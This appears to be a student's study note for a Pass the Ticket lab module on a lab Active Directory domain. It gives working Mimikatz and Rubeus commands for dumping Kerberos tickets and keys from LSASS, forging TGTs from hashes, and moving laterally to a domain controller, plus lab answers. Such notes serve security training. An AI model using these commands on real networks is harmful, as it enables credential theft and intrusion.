---
description: >-
  ๊Using stolen Kerberos ticket to move laterally instead of an NTLM password
  hash
---

# Pass the Ticket (PtT)

### Kerberos Protocol

Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service

* `TGT - Ticket Granting Ticket` -> TGT permits the client to obtain additional Kerberos tickets
* `TGS - Ticket Granting Service` -> Allow services to verify the user's identity

TGT granting process

1. To request a ticket, user must authen with DC.
2. User encrypts current timestamp with password hash.
3. DC decrypts it and sends TGT.
4. Once user get's their ticket they don't have to authen with their password.

TGS granting process

1. User request TGS from Key Distribution Center (KDC) to connect to a service.
2. User presents TGT to KDC.
3. KDC grants TGS to access paticular service.

### Harvesting Kerberos Tickets from Windows

Tickets are processed and stored by the LSASS. You must communicate with LSASS and request a ticket.

* <mark style="color:red;">**non-administrative user can only get their tickets.**</mark>
* <mark style="color:red;">**local administrator can collect everything.**</mark>

**Mimikatz - Export Tickets**

```cmd-session
c:\tools> mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export
```

The tickets will be stored in the current folder with the `.kirbi` extension. eg.

```cmd-session
c:\tools> dir *.kirbi

Directory: c:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----

<SNIP>

-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi
```

The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory.&#x20;

eg. of a user ticket.

`[randomvalue]-username@service-domain.local.kirbi`

> if we run "sekurlsa::ekeys" it presents all hashes as des\_cbc\_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.

**Rubeus - Export Tickets**

```cmd-session
Rubeus.exe dump /nowrap
```

Rubeus prints the ticket encoded in base64 format and the option /nowrap is for easier copy-paste.

### Pass the Key or OverPass the Hash

`pass-the-hash != over-pass-the-hash.` The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all. `Pass the Key` or `OverPass the Hash` **converts** a hash/key for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`.

**Mimikatz - Extract Kerberos Keys**

```cmd-session
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Doing so you will get `Domain`, `Username`, `AES256_HMAC` and `RC4_HMAC` keys.

1.  **Mimikatz - Pass the Key or OverPass the Hash**

    ```cmd-session
    c:\tools> mimikatz.exe
    mimikatz # privilege::debug
    mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
    ```

    This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.
2.  **Rubeus - Pass the Key or OverPass the Hash**\


    ```cmd-session
    c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
    ```

> Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

### Pass the Ticket (PtT)

Now that we have some Kerberos tickets, we can use them to move laterally within an environment.

With `Rubeus` we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.

**Rubeus Pass the Ticket**

```cmd-session
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

**Rubeus Pass the Ticket by importing .kirbi**

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

**Rubeus Pass the Ticket - Base64 Format**

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```

**Mimikatz - Pass the Ticket**

```cmd-session
C:\tools> mimikatz.exe 
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
mimikatz # exit
Bye!
c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

### Pass The Ticket with PowerShell Remoting (Windows)

**Mimikatz - Pass the Ticket for Lateral Movement.**

```
C:\tools> mimikatz.exe 
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
mimikatz # exit
Bye!

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
[DC01]: PS C:\Users\john\Documents>
```

**Rubeus - PowerShell Remoting with Pass the Ticket**

1.  **Create a Sacrificial Process with Rubeus**

    ```cmd-session
    Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
    ```

    command will open a new cmd window, we can execute Rubeus to request a new TGT with the option `/ptt` on that new cmd as follow.
2.  **Rubeus - Pass the Ticket for Lateral Movement**\


    ```powershell
    c:\tools>Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
    c:\tools>powershell
    Windows PowerShell
    Copyright (C) 2015 Microsoft Corporation. All rights reserved.

    PS C:\tools> Enter-PSSession -ComputerName DC01
    [DC01]: PS C:\Users\john\Documents> whoami
    inlanefreight\john
    [DC01]: PS C:\Users\john\Documents> hostname
    DC01
    ```

### **Assesment**

Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?

* 3

```
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption><p>total TGT found</p></figcaption></figure>

Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \DC01.inlanefreight.htb\john

1. run mimikatz and pass john's kirbi file.
2. exit mimikatz and access \\\DC01.inlanefreight.htb\john
3. read the flag

Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt

1. using the same session from previos method and enter the ps session of DC01\
   `Enter-PSSession -ComputerName DC0`
2. read the flag C:\john\john.txt

### Optional Exercises

Challenge your understanding of the Module content and answer the optional question(s) below. These are considered supplementary content and are not required to complete the Module. You can reveal the answer at any time to check your work.

**run mimikatz to get the aes256 and rc4 keys**

```
Authentication Id : 0 ; 370248 (00000000:0005a648)
Session           : Service from 0
User Name         : john
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 6/27/2023 12:23:43 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1108

         * Username : john
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
         * Key List :
           aes256_hmac       9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
           rc4_hmac_nt       c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_hmac_old      c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_md4           c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_hmac_nt_exp   c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_hmac_old_exp  c4b0e1b10c7ce2c4723b4e2407ef81a2
```

```
.\Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
```





